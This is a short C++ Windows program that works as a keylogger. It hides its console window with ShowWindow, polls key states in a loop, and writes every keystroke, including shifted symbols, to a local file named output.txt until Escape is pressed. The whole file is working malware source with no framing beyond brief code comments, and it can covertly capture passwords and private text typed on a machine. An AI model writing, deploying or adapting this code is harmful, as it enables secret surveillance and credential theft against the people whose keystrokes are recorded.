#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;


int main()
{
    //Hide the Window
    HWND window;
    window = FindWindowA("ConsoleWindowClass",NULL);
    AllocConsole();
    ShowWindow(window, 0);
    //Temp output file
    string outfile = "output.txt";
    ofstream output;
    output.open(outfile);
    int stopKey = 0x1b;
    bool ongoing = true;
	while (ongoing) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{   
            
			if (GetAsyncKeyState(KEY) == -32767) {
                 
                //if shift is down
                if(GetAsyncKeyState(VK_SHIFT) & 0x8000){
                    switch(KEY){
                        case 0x31:
                            output << '!';
                        break;
                        case 0x32:
                            output << '@';
                        break;
                        case 0x33:
                            output << '#';
                        break;
                        case 0x34:
                            output << '$';
                        break;
                        case 0x35:
                            output << '%';
                        break;
                        case 0x36:
                            output << '^';
                        break;
                        case 0x37:
                            output << '&';
                        break;
                        case 0x38:
                            output << '*';
                        break;
                        case 0x39:
                            output << '(';
                        break;
                        case 0x30:
                            output << ')';
                        break;
                        default:
                            char outChar = KEY;
                            output << outChar;
                        break;
                    }
                }
                else{
                    if(KEY == stopKey){
                        output.close();
                        exit(0);
                    }
                    //need to make lowercase
                        char outChar = tolower(KEY);
                        output << outChar;
                    
                }
                
                //stop on escape
               
				}
			}
            // to not use much cpu
            Sleep(10);
		}
        output.close();
}


